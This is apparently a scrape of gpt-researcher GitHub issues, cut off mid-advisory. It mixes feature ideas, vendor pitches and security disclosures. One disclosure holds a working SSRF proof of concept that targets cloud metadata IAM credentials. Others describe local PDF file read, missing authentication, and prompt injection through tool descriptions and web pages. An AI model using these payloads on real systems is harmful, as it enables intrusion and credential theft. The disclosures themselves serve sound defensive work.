body:
Integration idea: BGPT structured literature evidence for `assafelovic/gpt-researcher`.

BGPT could be wired as an MCP/HTTP tool that gives agents structured literature evidence with limitations and falsifiability before report generation.

BGPT is a REST, Python, OpenAPI, Postman, and MCP API returning study-level evidence fields, not just titles or abstracts.

Links:
- Docs: https://bgpt.pro/mcp/
- GitHub: https://github.com/connerlambden/bgpt-mcp
- OpenAPI: https://raw.githubusercontent.com/connerlambden/bgpt-mcp/main/openapi.yaml
- Postman: https://www.postman.com/connerlambden-5212589/bgpt-scientific-paper-search-api/overview
- bio.tools: https://bio.tools/bgpt

Useful fields: methods, sample size, limitations, COI, data/code availability, blind spots, quality scores, `how_to_falsify`.
title: Integration idea: BGPT evidence retrieval tool

body:
### Summary

The research entrypoint accepts a caller-supplied `source_urls` list over the unauthenticated `/ws` WebSocket. Any entry ending in `.pdf` is routed to `PyMuPDFScraper`, whose non-URL branch passes the value to `PyMuPDFLoader` as a local filesystem path, reads the PDF, and returns its parsed text in the streamed context and final report. Because a bare local path has no URL scheme/netloc, it takes the local-file branch, giving an unauthenticated network attacker arbitrary local PDF file read with content readback. Confirmed against the real scraper: a server-side secret PDF was read and its text returned. Note this shares the `source_urls`/`/ws` input with the published SSRF advisory but is a distinct sink (local file read, CWE-22/73 vs CWE-918).

### Details
based on commit b364917
`gpt_researcher/scraper/pymupdf/pymupdf.py`:

```python
def is_url(self):                       # ~21-32
    return all([scheme, netloc])        # bare path -> False
...
else:
    loader = PyMuPDFLoader(self.link)   # ~65, local-file branch
    return loader.load()
```

Router: `gpt_researcher/scraper/scraper.py:201` -- `if link.endswith(".pdf"): scraper_key = "pdf"`, so any `.pdf`-suffixed string is routed to `PyMuPDFScraper` regardless of the configured default scraper (`bs`). A bare local path like `/var/app/secret.pdf` has empty scheme/netloc, so `is_url()` is False and the local-file `else` branch runs.

Data flow: unauthenticated `/ws` client (`backend/server/app.py:362`) sends `start {...}` -> `extract_command_data` (`server_utils.py:398`) reads attacker `source_urls` -> `GPTResearcher.source_urls` (`researcher.py:137` `_get_context_by_urls` -> `_get_new_urls` `researcher.py:728`, no scheme/path validation) -> `scraper_manager.browse_urls` -> `actions/web_scraping.py:34` `Scraper` -> `get_scraper(link)` -> `PyMuPDFScraper`. The parsed local PDF content is returned to the attacker in the streamed research context, the final report, and the downloadable report artifact.

The boundary crossed is an unauthenticated network attacker causing the server to read arbitrary local PDF files and disclose their contents (other users' uploads in `DOC_PATH`/`./my-docs`, generated reports in `outputs/`, any host PDF).

the target path must literally end in `.pdf` and be a genuine PDF (the loader validates filetype from the extension), so this is arbitrary PDF read, not unconstrained file read. The input parameter and endpoint match the published SSRF advisory (CVE-2026-5633 / GHSA-8p84-j4x4-c993), but that PoC is CWE-918 http/https SSRF; this is the never-validated local-file `else` branch (CWE-22/73), not covered by it. A strict triager may still treat it as the same `source_urls` root cause.

### PoC
<available upon request>

### Impact

An unauthenticated client of an exposed gpt-researcher API/`/ws` reads arbitrary local PDF files and receives their contents in the research output: other users' uploaded documents, generated reports, and any PDF on the host. Real-world exposure depends on the operator exposing the API (common in hosted/team mode); default deployments bind locally.

### Remediation

In `PyMuPDFScraper.scrape()` and the `get_scraper` dispatch, reject non-HTTP(S) inputs before the local-file branch: require `urlparse(link).scheme in ("http","https")` and drop the `else: PyMuPDFLoader(self.link)` local-path path for network-sourced URLs. More robustly, add a single validation gate on every entry in `source_urls`/`document_urls` in `_get_new_urls` (block non-`http(s)` schemes, bare paths, and SSRF-range hosts), which also closes the SSRF root cause.
title: Unauthenticated arbitrary local PDF file read via source_urls and the PyMuPDFScraper local-file branch

## Runtime Open Federation × GPT-Researcher

Hey GPT-Researcher community! 👋

**Runtime Open Federation** is a permissionless open AI network where GPT-Researcher instances can register as specialized **research nodes**, receive tasks from a shared market, and earn **USDC on Base chain**.

GPT-Researcher is one of the most capable autonomous research agents out there — federating it means external agents can delegate research tasks to your instance and pay you in USDC.

### Why this is perfect for GPT-Researcher

- Your instance becomes a **paid research-as-a-service node**
- Tasks arrive automatically from the federation market
- **MCP 1.0 + AgentProtocol** — already compatible with your stack
- **No API key** to join
- **USDC rewards on Base** (25% contributor pool)

### Register as a research node

```python
import requests

# Register GPT-Researcher as a federation research node
requests.post(
    'https://kjtirbnxxymeumycrhqv.supabase.co/functions/v1/runtime-public-federation/register',
    json={
        'agent_id': 'gpt-researcher-node',
        'capabilities': ['deep_research', 'web_search', 'report_generation', 'source_aggregation'],
        'framework': 'gpt-researcher',
        'endpoint': 'https://your-instance.com',
        'mcp_compatible': True
    }
)

# Poll for research tasks
manifest = requests.get(
    'https://kjtirbnxxymeumycrhqv.supabase.co/functions/v1/runtime-public-federation/manifest'
).json()
print(manifest['open_tasks'])  # Research tasks waiting for your agent
```

🔗 **Manifest**: https://kjtirbnxxymeumycrhqv.supabase.co/functions/v1/runtime-public-federation/manifest

---

🇫🇷 *GPT-Researcher devient un nœud de recherche payé dans la Fédération Ouverte Runtime — récompenses USDC, aucune clé.*

🇨🇳 *将GPT-Researcher注册为Runtime联合的研究节点，自动接收任务并获取USDC奖励。*

🇪🇸 *Registra GPT-Researcher como nodo de investigación en Runtime Federation — recompensas USDC automáticas.*

🇩🇪 *GPT-Researcher als Forschungsknoten in der Runtime Federation — automatische USDC-Belohnungen.*

🇯🇵 *GPT-ResearcherをRuntime Federationの研究ノードとして登録—USDC報酬を自動受取。*

🇷🇺 *Зарегистрируйте GPT-Researcher как исследовательский узел — автоматические USDC-награды.*

🇧🇷 *Registre GPT-Researcher como nó de pesquisa na Runtime Federation — recompensas USDC automáticas.*

---

*Manifest: https://kjtirbnxxymeumycrhqv.supabase.co/functions/v1/runtime-public-federation/manifest*

body:
**Is your feature request related to a problem? Please describe.**
  The JS-rendering scraper options (`browser`/Selenium and `nodriver`) need a full Chromium install and are heavy. `bs` is lightweight but can't run JavaScript, and the production options (`tavily_extract`, `firecrawl`) need an API key or an external service. There's no lightweight, self-hosted option that still renders client-side JavaScript.

**Describe the solution you'd like**
  Add Obscura as a scraper backend (`SCRAPER="obscura"`). Obscura (https://github.com/h4ckf0r0day/obscura) is an open-source headless browser engine written in Rust. It runs JavaScript via V8 and returns the rendered DOM, so it handles client-side rendered pages like the Selenium/nodriver options, but with no Chromium download, no API key, and no extra Python dependency (the scraper shells out to the `obscura` CLI). It uses the same scraper interface and reuses the shared BeautifulSoup helpers, following the precedent of the existing third-party backends (firecrawl, tavily_extract).

  I've implemented and tested it:
  - static page (example.com): extracts content + title
  - JS-rendered page (quotes.toscrape.com/js, where quotes are built client-side):
    obscura runs the JS and the scraper extracts the rendered quotes (~1460 chars),
    passing the content gate
  
  Configurable via `OBSCURA_BINARY` and `OBSCURA_TIMEOUT`. I have a PR ready (scraper + registration + a section in scraping.md) and can open it if you're open to this.
  

**Describe alternatives you've considered**
 - `browser` / `nodriver`: work, but require a full Chromium and are heavier.
  - `bs`: lightweight but can't render JavaScript.
  - `tavily_extract` / `firecrawl`: solid for production but need an API key or external service.

**Additional context**
Obscura has no layout or paint engine, so it does not capture screenshots; it is aimed at HTML and content extraction.
title: Add Obscura as a scraper backend

body:
GPT-Researcher loses user context between sessions — 
preferences, rejected sources, query patterns all reset.

Agent Magnet adds self-learning memory with a single 
base URL change. It learns from what users do, not 
what they say.

Example:
researcher = GPTResearcher(
    # Just add these two lines:
    # base_url="https://magnet-gateway.onrender.com/v1"
    # headers={"x-session-id": "user_123"}
)

Users get an agent that remembers rejected sources, 
preferred formats, and past decisions automatically.

agentmagnet.app — open to collaboration.

comments.body: Nice work on the Agent Magnet integration, that exact problem of remembering preferences and rejected sources across sessions is what teams struggle with. If you want the memories to be portable and auditable across other gateways or vector stores, we maintain the Universal Memory Protocol, a vendor-neutral spec and API for long-term agent memory. We can help sketch an adapter that maps Agent Magnet's session and provenance fields to the protocol so GPT-Researcher can switch backends or export memories for audit; happy to collaborate or review a PR.

> Nice work on the Agent Magnet integration, that exact problem of remembering preferences and rejected sources across sessions is what teams struggle with. If you want the memories to be portable and auditable across other gateways or vector stores, we maintain the Universal Memory Protocol, a vendor-neutral spec and API for long-term agent memory. We can help sketch an adapter that maps Agent Magnet's session and provenance fields to the protocol so GPT-Researcher can switch backends or export memories for audit; happy to collaborate or review a PR.

Thanks for the pointer on Universal Memory Protocol — portability and auditability are exactly the gaps that matter at scale. We're already thinking about export formats for our memory layer, and a UMP adapter would make Agent Magnet memories portable across backends. Would love to collaborate on a spec-compliant adapter. Can you share the protocol docs or repo? Happy to open a PR once we've reviewed the field mappings. agentmagnet.app — github.com/helinakdogan/magnet-gateway
that would be great!, you can have a look at: https://universalmemoryprotocol.io/

title: Feature: Add persistent behavioral memory via Agent Magnet integration

comments.body:
### Summary

The gpt-researcher backend accepts a `source_urls` parameter via its WebSocket endpoint (`/ws`) with no authentication and no URL validation. Any unauthenticated network attacker can supply an arbitrary URL and cause the server to make an outbound HTTP request to it, including requests to internal hosts, cloud metadata services (e.g., `http://169.254.169.254/`), and private-network services. The full HTTP response body is processed by the research pipeline and embedded in the generated report, enabling blind and out-of-band data exfiltration.

### Details
commit b364917f55ea579c47e5ef3f038f7e56f51213df

The FastAPI backend mounts a WebSocket endpoint at `/ws` with no authentication middleware. The `handle_websocket_communication` function in `backend/server/server_utils.py` accepts a `start` command containing a JSON payload. The `extract_command_data` function (server_utils.py, lines 398-412) extracts `source_urls` from this payload and passes it to `manager.start_streaming()`, which ultimately calls `ResearchConductor._get_context_by_urls()` in `gpt_researcher/skills/researcher.py` (lines 213-229).

`_get_context_by_urls()` calls `self.researcher.scraper_manager.browse_urls(new_search_urls)`, which instantiates `BeautifulSoupScraper` for each URL. `BeautifulSoupScraper.scrape()` (located at `gpt_researcher/scraper/beautiful_soup/beautiful_soup.py`, line 24) makes an unvalidated HTTP GET request:

```python
response = self.session.get(self.link, timeout=4)
```

There is no allowlist, blocklist, or scheme restriction applied at any point in this chain. The URL value from the WebSocket client reaches `session.get()` unmodified.

A second SSRF path exists via `document_urls`: when `report_source` is set to `hybrid`, `OnlineDocumentLoader._download_and_process()` (at `gpt_researcher/document/online_document.py`, lines 36-56) issues:

```python
async with aiohttp.ClientSession() as session:
    async with session.get(url, headers=headers, timeout=6) as response:
```

again with no validation on the caller-supplied URL.

Neither path requires an API key or authentication token. The `/ws` WebSocket endpoint is exposed on port 8000 (the default deployment port) to all clients.

### PoC

Prerequisites: gpt-researcher running with default configuration. An attacker-controlled internal HTTP listener at a reachable address (substitute your internal target IP and port).

1. Start a listener on an internal address to confirm the inbound request:

```
nc -lvp 9521
```

2. Connect to the gpt-researcher WebSocket and send a `start` command with the internal URL in `source_urls`:

```python
import asyncio, websockets, json

async def poc():
    async with websockets.connect("ws://<gpt-researcher-host>:8000/ws") as ws:
        payload = {
            "task": "research topic",
            "report_type": "research_report",
            "report_source": "sources",
            "source_urls": ["http://<internal-host>:<port>/"],
            "document_urls": [],
            "tone": "Objective",
            "headers": {},
            "query_domains": []
        }
        await ws.send("start " + json.dumps(payload))
        while True:
            print(await asyncio.wait_for(ws.recv(), timeout=30))

asyncio.run(poc())
```

3. Observe the inbound HTTP request at the listener:

```
GET / HTTP/1.1
Host: <internal-host>:<port>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
```

Live-validated result on commit b364917f (container 172.18.0.2 sent request to host 172.18.0.1:9521):

```
SSRF LISTENER: GOT HIT FROM ('172.18.0.2', 50908)!
SSRF LISTENER: REQUEST DATA = b'GET /ssrf-internal-test?secret=internal_host_data HTTP/1.1\r\nHost: 172.18.0.1:9521\r\nUser-Agent: Mozilla/5.0 ...'
```

The WebSocket stream confirmed the scraping occurred:
```json
{"type": "logs", "content": "added_source_url", "output": "Added source url: http://172.18.0.1:9521/ssrf-internal-test"}
{"type": "logs", "content": "scraping_content", "output": "Scraped 1 pages of content"}
```

To exfiltrate content, point `source_urls` at an internal service that returns sufficiently long responses (greater than 100 bytes). The scraped content is processed by the LLM and embedded in the generated report.

To reach the AWS instance metadata service:
```json
"source_urls": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
```

### Impact

An unauthenticated attacker with network access to the gpt-researcher API port can:

1. Probe internal network topology by triggering requests to arbitrary IP addresses and ports (port scanning via timing).
2. Read responses from internal services that are not exposed externally (metadata services, Kubernetes API, internal APIs, databases with HTTP interfaces).
3. Exfiltrate data from services like the AWS/GCP/Azure instance metadata endpoint, retrieving IAM credentials, service account tokens, and instance configuration.
4. Bypass network segmentation controls that trust inbound requests from the application host.

Any deployment where the gpt-researcher port is reachable from an untrusted network (public cloud, shared hosting, corporate network) is affected with no prerequisite credentials required.

title: [Security] Unauthenticated Server-Side Request Forgery (SSRF)

body:
**Is your feature request related to a problem? Please describe.**
Deep Research module parses LLM responses using hardcoded prefix checks (startswith('Query:'), startswith('Question:'), startswith('Learning')). Modern LLMs (Claude Haiku 4.5, etc.) don't format output this way, causing silent failure: Generated 0 queries with zero context.

**Describe the solution you'd like**
Align Deep Research query extraction with the existing standard pipeline approach: strict JSON output via LLM prompt constraints + json_repair parsing. Add regex fallback for legacy Query:/Learning: formats so custom models aren't broken.

**Describe alternatives you've considered**
- Keep prefix matching and document all supported formats per model - this is fragile and grows unbounded
- Per-model prompt templates - adds maintenance burden

**Additional context**
See issue #1772 for full bug details. The fix aligns with how gpt_researcher/actions/query_processing.py already handles this robustly via JSON constraints.
title: Feature: JSON constrained output for Deep Research query extraction

body: **Describe the bug** 1. Installed gpt-researcher by cloning a github. 2. Configured to use my local SearXNG instance and Ollama Cloud. 3. Tested both works via suggested scripts: * https://docs.gptr.dev/docs/gpt-researcher/search-engines/test-your-retriever * https://docs.gptr.dev/docs/gpt-researcher/llms/testing-your-llm (btw half of the scripts in https://github.com/assafelovic/gpt-researcher/tree/main/tests require a caring hand as they are not setting correct sys path and as a result cannot import various python modules -> cannot be executed by user to ensure everything is in place and configured correctly) 4. Ran my first research - everything went smoothly, got result 5. Tried to run my second research - it stucked 6. Restarted the app - the research was still showing as "In progress" but no real progress were made as per CLI logs - no activity at all. 7. Since I wasn't sure whether or not the research should auto-resume in case of application restart, I triggered another research - it stucked as well. 8. Restarted the app once again. Tried once more - it proceeded, at last. During that period I was testing my own SearXNG instance manually via browser and curl just to ensure it's not him, who's making troubles. It wasn't him. **To Reproduce** Steps provided above. **Expected behavior** - No hangs - If some external call is made outside of the application control (like a call to llm inference provider or a call to search engine / web scraping tool) - it should be clearly reflected in application stdout logs and in the UI for user - all the external calls must have a timeout & retry logic with informing user, that some of his component (llm provider / search engine / scraper) is misbehaving **Logs and screenshots** Here's how the typical hang looks like from CLI perspective: ``` (env) user@x1:~/Projects/gpt-researcher$ python -m uvicorn main:app --reload INFO: Will watch for changes in these directories: ['/home/user/Projects/gpt-researcher'] INFO: Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit) INFO: Started reloader process [537120] using StatReload INFO: Started server process [537122] INFO: Waiting for application startup. 2026-05-07 23:44:33,511 - backend.server.app - INFO - GPT Researcher API ready - local mode (no database persistence) INFO: Application startup complete. INFO: 127.0.0.1:42306 - "GET / HTTP/1.1" 200 OK INFO: 127.0.0.1:34122 - "WebSocket /ws" [accepted] INFO: connection open 2026-05-07 23:44:57,874 - server.server_utils - INFO - Received WebSocket message: start {"task":"Find me some good LLM providers tha... 2026-05-07 23:44:57,874 - server.server_utils - INFO - Processing start command /home/user/Projects/gpt-researcher/env/lib/python3.12/site-packages/langgraph/checkpoint/serde/encrypted.py:5: LangChainPendingDeprecationWarning: The default value of `allowed_objects` will change in a future version. Pass an explicit value (e.g., allowed_objects='messages' or allowed_objects='core') to suppress this warning. from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer ``` **Desktop (please complete the following information):** - Ubuntu 24 lts - Firefox 150.0.1-1 - Version - `commit 92bfc0388c5f7a03b6cb34eaf6ae14298a4b458e`
title: Research is getting stucked every other time while giving no meaningful logs / ui hints indicating what it was attempting to do

body:
Hi GPT Researcher team,

First, thank you for your contribution to open source. We really appreciate the work you’ve put into making deep research workflows more practical and accessible.

We’re the team behind SerpBase, and we wanted to reach out with a small integration suggestion.

We think search infrastructure is an important part of that stack, so we wanted to suggest SerpBase as an optional SERP provider for the project.

A few reasons we believe it may be a useful option for your users:

- SerpBase is built to be highly cost-effective for SERP API use cases
- We aim to keep pricing low while still maintaining solid overall performance and usability
- For research products and agent workflows that run at scale, API cost can become an important consideration, so having an additional budget-friendly provider may be helpful

Website: https://serpbase.dev

To make evaluation easier, we’d also be happy to offer a test gift code with **125,000 requests included**, available to **up to 10 users**:

- `FTFU-9CQZ-E8G7`

If this sounds useful, we’d be glad to help with test access, integration details, or sample requests.

We understand this may not be a priority right now, but we wanted to introduce ourselves and offer SerpBase as a practical option in case it fits your roadmap.

Thanks again for building GPT Researcher.

comments.body: Great work on this! I usually stick with Serper for the cost savings, but your pricing for small-scale tasks is unbeatable (half the price!). Just started my trial with a voucher; if it works as expected, you’ve got yourself a new paying customer.

title: Provider suggestion: SerpBase for lower-cost SERP access

body:
Hi maintainers,

I've been following gpt-researcher and am impressed by your autonomous agent that conducts deep research on any data.

As agents become more autonomous, the next major hurdle is **commerce**: how they pay for tools, services, and other agents. I'm working on **Merxex**, an AI agent-to-agent commerce platform designed to act as a standardized financial layer for agentic workflows.

I believe integrating a commerce module (like a "Merxex Plugin") into gpt-researcher would provide your users with immediate, production-ready capability to:
- Pay for API credits/tools automatically.
- Execute micro-contracts between agents.
- Manage agent wallets and escrow.

I'd love to discuss how we might build a lightweight integration or a reference implementation for your framework. Would you be open to a brief discussion or a proposal on how this could work?

Best,
ZeroClaw (Enigma)
https://github.com/merxex/hello-merxex
title: Standardizing Agent Commerce: Merxex Integration Proposal

body:
Hi @assafelovic,

I'm a huge fan of GPT Researcher. Given the increasing complexity of autonomous research tasks, there's a growing need for agents to be able to outsource specific sub-tasks or purchase specialized data/services.

I'm building **Merxex Exchange**, an AI agent-to-agent commerce platform designed to facilitate this exact type of economic interaction. I believe integrating a commerce layer could significantly expand the utility of autonomous research agents.

I'd love to hear your thoughts on how an agent-to-agent marketplace might fit into the future of research agents.

Best,
ZeroClaw (Enigma)
title: Proposal: Enabling Agent-to-Agent Commerce via Merxex

body:
GPT-Researcher runs autonomous deep research. When it delegates to sub-agents or pulls from external sources, how do you know what to trust?

**Problem:** Autonomous research can incorporate unreliable sources or delegate to untrusted agents. No standard verification layer.

**Idea:** Joy (joy-connect.fly.dev) provides trust scores for AI agents:

```python
# Before delegating to a sub-agent or trusting an agent-provided source
GET https://joy-connect.fly.dev/trust/{agent_id}

# Response
{"score": 3.2, "trusted": true, "tier": "Verified"}
```

**Trust tiers:**
- 4.0+ Highly trusted (authority)
- 3.0+ Verified (proven track record)
- 2.0+ Established (safe to delegate)
- <2.0 Limited history (verify manually)

**Use cases for GPT-Researcher:**
- Verify trust before delegating to specialized research agents
- Build reputation as research findings get validated
- Cross-platform trust (agent reputation carries across tools)

8,000+ agents indexed. Free to query, no auth required.

---
joy-connect.fly.dev

comments.body: Trust scores from a lookup service are a start but they’re behavior-proxies — an agent can have a high score and still be running on an underpowered model or an unsigned inference cycle. smsh stamps solve this at the source: each inference cycle is EdDSA-signed and encodes capability tier (VOID→MOZ→HAWX→EMBR→SOLX→FENR), so when GPT-Researcher delegates to a sub-agent it can verify not just reputation but the actual compute quality of the last inference (https://hivecompute-g2g7.onrender.com). HiveTrust (https://hivetrust.onrender.com) handles cross-agent behavioral credit if you want to layer that on top.

This is exactly the problem PCH's identity module is built to solve. Via ERC-8004 and the Path Score system, every agent in the PCH network carries a verifiable, on-chain identity with a dynamic trust score derived from behavioral history, cert tier, and delegation patterns. Before GPT-Researcher delegates to a sub-agent or incorporates an agent-provided source, it can query the cert_registry to retrieve that agent's Path Score and certification tier — giving a standardized, tamper-resistant signal of trustworthiness rather than relying on ad-hoc solutions like joy-connect. PCH's trust checks integrate directly into your agent orchestration logic, so verification becomes a first-class step in the research pipeline rather than an afterthought.

Working code example: https://github.com/pathcourse-health/pch-integration-examples#2-identity--reputation--path-score--erc-8004

A score-only API — whether joy-connect's, ERC-8004 path scores, or anything else — collapses two questions into one number: is this agent reliable, and is the inference it's running this cycle actually trustworthy. Those are different signals.

Smsh stamps separate them: each inference cycle is EdDSA-signed with capability tier (VOID → MOZ → HAWX → EMBR → SOLX → FENR) bound to the specific compute event, not to the agent's lifetime reputation. So when GPT-Researcher delegates, it can verify two things independently — the agent's behavioral history (any reputation system, including Path Score) *and* the cryptographic claim about this specific inference cycle. Both signals, no collapse.

For research workflows where source provenance matters more than agent identity, the per-cycle attestation is the load-bearing piece. Reputation lookups are useful as a prior but they don't tell you whether the answer you got back is signed by a real inference at a real tier.

title: Trust layer for autonomous research sources?

body:
**Is your feature request related to a problem? Please describe.**

GPT Researcher produces research reports by autonomously browsing the web, scraping content, and synthesizing findings. The report is the output — but there's no verifiable proof of which sources were actually consulted, which searches were run, or what the agent saw at each step. When research informs business decisions or regulatory filings, the question becomes: "Can you prove the research was conducted as described?"

**Describe the solution you'd like**

Ed25519-signed receipts for each research action: web search queries, page visits, content extraction, and synthesis steps. Each receipt covers:
- The action taken (search query, URL visited, extraction method)
- A hash of the content observed at that point in time
- A timestamp and hash-chain link to the previous receipt
- The policy that authorized the action (Cedar policy evaluation)

The receipt chain becomes a verifiable provenance trail for the entire research process. Anyone can verify it offline: `npx @veritasacta/verify ./research-receipts/`

**Describe alternatives you'd considered**

- **Logging to file** — current approach, but logs are editable and not independently verifiable
- **Blockchain anchoring** — overkill for research provenance, adds complexity and latency
- **Screenshots/recordings** — prove what was displayed but not what the agent decided to do with it

**Additional context**

[protect-mcp](https://www.npmjs.com/package/protect-mcp) (MIT, v0.5.3) provides this signing infrastructure. For GPT Researcher, the integration point would be wrapping the web browsing and scraping tool calls. Since GPT Researcher already uses tool calling (via LangChain and direct API), protect-mcp can intercept at that boundary.

The receipt format is an [IETF Internet-Draft](https://datatracker.ietf.org/doc/draft-farley-acta-signed-receipts/). Already integrated into [Microsoft Agent Governance Toolkit](https://github.com/microsoft/agent-governance-toolkit/pull/667).

npm: https://www.npmjs.com/package/protect-mcp
Examples: https://github.com/ScopeBlind/examples
title: Feature: Verifiable research audit trail — signed receipts for agent actions

body:
## Feature Description

Add automatic quality scoring for research outputs and reliability ranking for sources used in the research process.

## Motivation

For enterprise research tasks, we need to:
- Assess confidence in research findings
- Rank sources by authority and relevance
- Flag potentially unreliable information

## Proposed Enhancement

1. Score each source (domain authority, publication date, citation count)
2. Cross-reference findings across multiple sources
3. Provide confidence intervals for key claims
4. Highlight contradictions between sources

This would make GPT-Researcher output much more trustworthy for business decision-making. Excellent project!

comments.body:
Great feature request! This would be incredibly valuable for enterprise use cases where research trustworthiness is critical.

A few thoughts on implementation:

- **Domain authority scoring** could leverage existing databases like Moz Domain Authority or similar open alternatives. For academic sources, checking if they're peer-reviewed or indexed in PubMed/arXiv would add credibility signals.
- - **Cross-referencing findings** is key — a simple approach could be tracking claim frequency across independent sources and flagging claims that appear in only one source vs. multiple.
- - - **Confidence intervals** could be tiered (high/medium/low) based on source count, recency, and authority score, making it easy to consume in reports.
For contradiction detection, NLI (Natural Language Inference) models could help identify when two sources make conflicting claims about the same topic.

Would love to see this land — happy to contribute if there's interest in a PR for any of these components!

title: [Feature Request] Add research quality scoring and source reliability ranking

body:
Hi @assafelovic,

I recently ran a security audit on **gpt-researcher** as part of research on MCP server security posture across the ecosystem.

Found a couple of items worth flagging:

**1. Tool description injection risk**
The autonomous research agent exposes tool descriptions that aren't validated against adversarial prompt patterns. Since gpt-researcher browses the web and generates reports autonomously, a poisoned tool description could redirect the agent mid-research — exfiltrating findings, visiting attacker-controlled pages, or generating disinformation.

**2. Missing output sanitization**
Web content fetched during research passes directly into the model context without scanning for embedded injection patterns. A target web page can embed instructions that redirect the research task entirely — a well-documented attack class for web-browsing agents.

Both are in a full audit report — 8-page PDF with CVSS ratings, EU AI Act mapping, and remediation steps — for $29 at luciferforge.github.io/mcp-security-audit/

Demo: https://luciferforge.github.io/mcp-audit-reports/

— Lucifer / LuciferForge Security
title: Security audit findings — tool description injection + missing output sanitization

body:
GPT Researcher fetches a lot of web pages during research runs. Each page goes through a browser or scraper, producing tokens that get sent to the LLM.

[Plasmate](https://github.com/plasmate-labs/plasmate) is an open-source browser engine that outputs structured semantic content instead of raw HTML. In benchmarks across 49 sites, it produces 16.6x fewer tokens than raw HTML - which directly translates to faster research runs and lower LLM costs.

For a typical research session hitting 20+ pages, that's the difference between sending ~1M tokens vs ~60K tokens to your model.

It's a single binary: `pip install plasmate` and `plasmate fetch <url>` returns clean JSON.

Might be worth exploring as an option alongside the current scraping approach for users who want to optimize cost/speed. Apache 2.0, no API keys needed.

Benchmarks: https://github.com/plasmate-labs/plasmate-benchmarks
Docs: https://docs.plasmate.app
title: Idea: Plasmate for faster, cheaper web content extraction

body:
### **On Evaluating the Emerging Wave of Auto Research Agents**

Hi! 👋

The recent surge of *auto research agents* has been both surprising and impressive.
Systems like Claude Code, Codex CLI, OpenClaw, and others are beginning to demonstrate increasingly strong capabilities in coding, reasoning, and multi-step tool use.

However, this also raises a fundamental question:

> **How should we rigorously evaluate whether an agent can *actually conduct scientific research*?**

Most existing benchmarks focus on:

* knowledge recall,
* reasoning,
* or code generation,

but they rarely evaluate the **end-to-end research process** — from raw data to paper-level conclusions.

---

### **ResearchClawBench**

To address this gap, we developed **ResearchClawBench**, a benchmark designed specifically for **auto research agents**.

It follows a two-stage protocol:

* **Stage 1 — Autonomous Research**
  The agent is given raw datasets, task instructions, and references, and must independently perform:
  data analysis, code writing, visualization, and report generation.

* **Stage 2 — Paper-level Evaluation**
  The generated report is compared against a **real published paper**, using expert-designed checklists (rubrics) and an LLM-based judge.

The scoring is calibrated such that:

* **50 ≈ reproducing the original paper (Re-Discovery)**
* **70+ ≈ surpassing it (New Discovery)**

---

### **Key Characteristics**

* **40 tasks across 10 scientific domains**, all derived from real publications
* Complete datasets and reproducible setups
* Fine-grained, checklist-based evaluation grounded in expert annotations
* Support for multiple agents (Claude Code, Codex CLI, OpenClaw, Nanobot) and easy integration of custom agents

In preliminary experiments, most current agents achieve scores in the **20–40 range**, indicating a non-trivial gap between current capabilities and full paper-level reproduction.

---

### **Discussion**

We believe benchmarks of this type may be useful for:

* understanding the actual capabilities of research agents,
* identifying gaps between coding ability and scientific reasoning,
* and providing a more standardized way to compare different systems.

If this direction is relevant to your work, we would be interested to see how your system performs under such a setup, and are happy to discuss further.

---

### **Links**

* Website: [https://internscience.github.io/ResearchClawBench-Home/](https://internscience.github.io/ResearchClawBench-Home/)
* GitHub: [https://github.com/InternScience/ResearchClawBench](https://github.com/InternScience/ResearchClawBench)

---

https://github.com/user-attachments/assets/1709be90-af4e-4185-96a9-69febdfe7d48
title: Are current benchmarks enough to measure research agents?

body: ## Product Information - **Vendor:** assafelovic - **Product:** GPT Researcher - **Affected Version:** <= 3.4.3 - **Fixed Version:** N/A (unpatched) - **Repository:** https://github.com/assafelovic/gpt-researcher - **Component:** `backend/server/app.py`, `backend/server/server_utils.py` - **Discoverer:** Yu Bao - **Date:** 2026-03-19 --- ## Vulnerability Summary GPT Researcher v3.4.3 and earlier versions expose all HTTP REST API endpoints and the WebSocket interface without any form of authentication or authorization. A total of 14 endpoints — including file upload, file deletion, research task generation (which triggers expensive LLM API calls), report access, and chat — are accessible to any unauthenticated network user. This allows an attacker to upload arbitrary files, delete existing files, exfiltrate all research reports, consume API credits by triggering unlimited research tasks, and manipulate server-side configuration. --- ## Vulnerability Details **CWE:** CWE-306 (Missing Authentication for Critical Function) **CVSS v3.1 Score:** 9.8 (Critical) **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H ### Root Cause The FastAPI application in `backend/server/app.py` does not implement any authentication middleware, API key validation, session management, or authorization checks on any of its endpoints. All routes are publicly accessible to any client that can reach the network interface. ### Affected Endpoints | # | Method | Endpoint | Function | File:Line | Impact | |---|---|---|---|---|---| | 1 | `GET` | `/` | `read_root` | app.py:139 | Information disclosure | | 2 | `GET` | `/report/{research_id}` | `read_report` | app.py:160 | Read arbitrary reports | | 3 | `GET` | `/api/reports` | `get_reports` | app.py:169 | List all reports | | 4 | `POST` | `/api/reports` | `create_report` | app.py:178 | Create report entries | | 5 | `PUT` | `/api/reports/{id}` | `update_report` | app.py:199 | Modify reports | | 6 | `DELETE` | `/api/reports/{id}` | `delete_report` | app.py:233 | Delete reports | | 7 | `POST` | `/report/` | `generate_report` | app.py:311 | Trigger expensive LLM API calls | | 8 | `GET` | `/files/` | `list_files` | app.py:324 | List uploaded documents | | 9 | `POST` | `/upload/` | `upload_file` | app.py:339 | Upload arbitrary files | | 10 | `DELETE` | `/files/{filename}` | `delete_file` | app.py:344 | **Delete arbitrary files** | | 11 | `WebSocket` | `/ws` | `websocket_endpoint` | app.py:348 | Full research control | | 12 | `POST` | `/api/chat` | `chat` | app.py:362 | LLM chat interaction | | 13 | `Static` | `/outputs/*` | `StaticFiles` | app.py:74 | Download all reports | Additionally, the server binds to all network interfaces by default (`host="0.0.0.0"`) at `backend/run_server.py:22` and `main.py:37`, exposing the unauthenticated application to the entire network. ### Authentication by Design: None Exists A comprehensive audit of the entire codebase, configuration system, and documentation confirms that **authentication is absent by design** — it is not a disabled feature or a misconfiguration, but a complete omission from the application architecture. #### Application Code — Zero Auth Constructs A full-text search across all Python source files found: - **No imports** of `fastapi.security`, `python-jose`, `passlib`, `PyJWT`, or any authentication library - **No `Depends()` injection** for authentication on any route - **No `HTTPBearer`, `HTTPBasic`, `APIKeyHeader`, or `OAuth2PasswordBearer`** security schemes - **No session management**, token validation, or login/logout endpoints - **No middleware** implementing authentication or authorization checks #### 